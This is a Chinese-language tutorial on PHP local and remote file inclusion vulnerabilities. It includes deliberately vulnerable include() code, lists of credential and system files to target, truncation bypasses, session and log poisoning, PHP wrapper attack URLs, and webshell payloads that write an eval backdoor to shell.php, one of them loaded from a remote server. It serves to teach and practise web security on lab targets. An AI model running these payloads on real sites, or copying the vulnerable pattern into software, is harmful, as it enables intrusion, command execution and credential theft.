# 文件包含

## 目录
* [文件包含漏洞简介](#文件包含漏洞简介)
    * [文件包含函数](#文件包含函数)
    * [文件包含函数解析](#文件包含函数解析)
    * [漏洞产生原因](#漏洞产生原因)
    * [文件包含漏洞利用条件](#文件包含漏洞利用条件)
* [本地文件包含漏洞](#本地文件包含漏洞)
    * [常见敏感路径](#常见敏感路径)
    * [常见绕过方法](#常见绕过方法)
* [远程文件包含漏洞](#远程文件包含漏洞)
    * [常见绕过方法](#常见绕过方法)
* [本地文件包含的利用技巧](#本地文件包含的利用技巧)
    * [session文件包含](#session文件包含)
    * [包含日志](#包含日志)
* [PHP伪协议](#PHP伪协议)
    * [php://input](#php://input)
    * [php://filter](#php://filter)
    * [file://](#file://)
    * [data://](#data://)
    * [phar://](#phar://)
    * [zip://](#zip://)
* [漏洞利用方式总结](#漏洞利用方式总结)
* [参考](#参考)


## 文件包含漏洞简介

服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
### 文件包含函数

PHP中文件包含函数:

`require()`

`require_once()`

`include()`

`include_once()`

四种函数之间的区别:

* include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行
  
* include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次
  
### 文件包含函数解析

当使用上述四个函数包含一个新的文件时，该文件将作为PHP代码执行。PHP内核并不会在意该被包含的文件是什么类型。所以如果被包含的是txt文件，图片文件，远程URL，也都将作为PHP代码执行。

### 漏洞产生原因

文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件。
示例代码：

    <?php  
    $filename  = $_GET['filename'];  
    include($filename);  
    ?>

当传入的$filename为一个txt文件，且txt文件中包含可执行的PHP代码时，代码例如：

    <?
    php echo phpinfo(); 
    ?>

通过URL，可以发现代码被执行了，将得知PHP的信息。

### 文件包含漏洞利用条件

1. include()等函数通过动态变量的方式引入需要包含的文件；

2. 用户能够控制该动态变量。


## 本地文件包含漏洞

定义：能够打开并包含本地文件的漏洞，就叫本地文件包含漏洞。

### 常见敏感路径

Windows：
>c:\boot.ini // 查看系统版本

>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

>c:\windows\repair\sam // 存储Windows系统初次安装的密码

>c:\ProgramFiles\mysql\my.ini // MySQL配置

>c:\ProgramFiles\mysql\data\mysql\user.MYD //  MySQL root密码

>c:\windows\php.ini // php 配置信息

Linux:
>/etc/passwd // 账户信息

>/etc/shadow // 账户密码文件

>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

>/usr/local/app/php5/lib/php.ini // PHP相关配置

>/etc/httpd/conf/httpd.conf // Apache配置文件

>/etc/my.conf // mysql 配置文件

### 常见绕过方法

1.%00截断

原理：PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，可以用0字节（\x00）作为字符串结束符。

示例代码：

    <?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
    ?>

当URL为www.xxx.com/index.php?filename=.../../etc/file%00即可绕过.html。

2.路径长度截断
原理：
>Windows下目录最大长度为256字节，超出的部分会被丢弃；

>Linux下目录最大长度为4096字节，超出的部分会被丢弃。

利用代码：www.xxx.com/index.php?filename=abc././././././

PS：./长度需要根据系统不同选择不同的长度。
(./亦可用.....或../../替代。)


## 远程文件包含漏洞

定义: PHP的配置选项allow_url_fopen和allow_url_include设置为ON，include/require包含函数可以加载远程文件，这种漏洞被称为远程文件包含漏洞。

>allow_url_fopen = On（是否允许打开远程文件）

>allow_url_include = On（是否允许include/require远程文件）

###  常见绕过方法

1. 问号绕过

原理：问号后面的代码被解释成URL的querystring，属于一种“截断”。

2. %00绕过
原理同问号绕过一样。

3. #号绕过
原理同问号绕过一样。

4. 空格绕过
原理同问号绕过一样。


## 本地文件包含的利用技巧

本地文件包含漏洞有机会执行PHP代码，但需要一些条件。

远程文件包含漏洞之所以能够执行命令，就是攻击者能够自定义被包含的文件内容，本地文件包含漏洞想要执行命令，也需要找到能够控制内容的本地文件。

有几个技巧可以用于本地文件包含后执行PHP代码：

1. 包含用户上传的文件。

2. 包含data://或php://等伪协议。

    伪协议内容较多，将在下面单独讲解。
3. 包含session文件。

4. 包含日志文件，比如web server的access blog。

5. 包含/proc/self/environ文件。

6. 包含上传的临时文件（RFC1867）。

7. 包含其他应用创建的文件，比如数据库文件，缓存文件，应用日志等。

### session文件包含

利用条件：session的存储位置可以获取，且其中内容部分可控。

#### 存储位置获取方式：

1. 通过phpinfo的信息可以获取到session的存储位置。
   位置存储信息在session.save_path一行中。
2. 通过猜测默认的session存放位置进行尝试。
   常见存放位置有：
    
    /var/lib/php/sess_PHPSESSID
    
    /var/lib/php/sess_PHPSESSID
    
    /tmp/sess_PHPSESSID
    
    /tmp/sessions/sess_PHPSESSID

#### 漏洞分析
示例代码：
    
    <?php

    session_start();

    $ctfs=$_GET['ctfs'];

    $_SESSION["username"]=$ctfs;

    ?>

由代码能得知可以通过GET方式将ctfs变量的值存入到session中。

session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。

#### 用法
如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。
例如访问 www.xxx.com/session.php?ctfs=<?php phpinfo();?>后，会在/var/lib/php/session目录下存储session的值。
再通过文件包含漏洞解析恶意代码getshell。

### 包含日志

#### 访问日志

web服务器会将请求写入日志文件中，在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。

利用条件:知道服务器日志的存储路径，且日志文件可读。

用法： 

在通过burp抓包后，将PHP代码写入请求中，因为直接发起请求，部分特殊符号被编码，导致包含无法被解析。

PHP代码会写入/var/log/apache2/access.log，再通过进行包含即可。
#### SSH log

利用条件：需要知道ssh-log的位置，且可读。

默认情况下，ssh-log的位置为/var/log/auth.log

用法：
1. 通过SSH连接，例如：ssh '<?php phpinfo(); ?>'@192.168.1.129
   
    然后提示输入用户名和密码，可以随便输入。

2. 这时 PHP代码已经被写入ssh-log，再进行文件包含即可。


## PHP伪协议
下面所有运用的示例代码均为：
    
    <?php
	    $filename = $_GET['filename'];
	    include ($filename);
    ?>
个别不同的实例会贴出其示例代码。
### php://input

可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。

#### 基础运用
利用条件：
allow_url_fopen = On

用法：
www.xxx.com/index.php?filename=php://input
同时需要进行post data。

例如post data可以为
    
    <? phpinfo();?>

#### 写入木马
利用条件：
allow_url_fopen = On
&& allow_url_include = On

用法：
www.xxx.com/index.php?filename=php://input

和基础用法一致，不够POST的代码为一句话木马：

`<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>`

#### 命令执行
利用条件和用法和写入木马相似，不过POST数据有相应变化，例如：

`<?php system('whoami'); ?>`

### php://filter
元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。

利用条件：allow_url_fopen = On

用法：

www.xxx.com/index.php?filename=php://filter/read=convert.base64-encode/resource=xxx.php

或者

www.xxx.com/index.php?filename=php://filter/convert.base64-encode/resource=xxx.php

通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就可以看到文件源码。可以用来读取敏感文件。

### file://
通过file协议可以访问本地文件系统，读取到文件的内容。

用法：www.xxx.com/index.php?filename=file://c:/boot.ini
其中c:/boot.ini为本地文件，是可控制的。

### data://
数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。

利用条件：
1. php>=php5.2
2. allow_url_fopen = On
3. allow_url_include = On

用法：
1. www.www.com/index.php?filename=data:text/plain,<?php phpinfo();?>

2. www.www.com/index.php?filename=data:text/plain;base64,data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==


其中base64代表进行了base64加密，后面为加密后的代码。
PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==解码后为

`<?php system('whoami');?>`

### phar://
这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。

利用条件： 
1. PHP > =5.3.0
2. 压缩包需为zip协议，不可以为rar。

用法：www.xxx.com/index.php?filename=phar://test.zip/test.php

路径可以为绝对路径也可以为相对路径。

其中test.php压缩后可以将test.zip的后缀改成其他后缀，不影响利用。test.php的内容可以为一句话木马等其他内容。

### zip://
zip伪协议和phar协议类似，但是用法不一样。

条件：PHP > =5.3.0（Windows情况下，PHP同时需要<5.4)

用法：www.xxx.com/index.php?filename=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]

例如：www.xxx.com/index.php?filename=zip://c:/test/test.zip#test.php

在URL中#要用%23替代，否则浏览器默认不会传输特殊字符。

### 总结
网上找了一张图可以总结一部分伪协议。
![avatar](https://img-blog.csdn.net/20180606180044611)


## 漏洞利用方式总结
1.直接进行文件的遍历读取（读取敏感信息）

2.解析符合php规范的任何文件（本地包含配合文件上传）：
   
>可以利用文件包含函数可以解析任何符合PHP规范的文件的特性，结合文件上传获取webshell。

利用过程：

(1) 上传Web应用指定类型的文件，如：shell.jpg（需要确认文件上传后的绝对路径）

`<?fputs(fopen("shell.php","w"),"<?php @eval($_POST[topo]);?>")?>`

(2) 使用文件包含漏洞，直接解析上传的非php后缀的文件，获取webshell。
访问URL：http://www.xxx.com/index.php?page=./shell.jpg 在本地生成shell.php

3.远程包含Shell

(1) 先写一个test.txt文件，保存在自己的远程服务器xxx上，内容如下：

`<?fputs(fopen("shell.php","w"),"<?php eval($_POST[topo]);?>")?>`

(2) 则可以通过访问：http://www.xxx.com/index.php?page=http://www.xxx.com/test.txt

则会在服务器根目录下生产一个shell.php


## 漏洞靶场
推荐3个已知有文件包含漏洞的靶场：

* DVWA

* bWAPP

* webug


## 参考

* https://www.freebuf.com/articles/web/182280.html

* https://segmentfault.com/a/1190000016042983

* 《白帽子讲Web安全》

* https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession

* https://blog.csdn.net/zpy1998zpy/article/details/80598768